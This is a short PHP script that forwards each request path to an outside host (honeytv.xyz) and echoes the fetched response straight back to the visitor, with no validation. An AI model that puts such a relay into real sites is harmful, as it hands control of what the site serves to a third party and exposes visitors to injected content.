<?php


$url = 'http://honeytv.xyz:80' . $_SERVER['REQUEST_URI'];
$result = file_get_contents($url);

echo  $result;


?>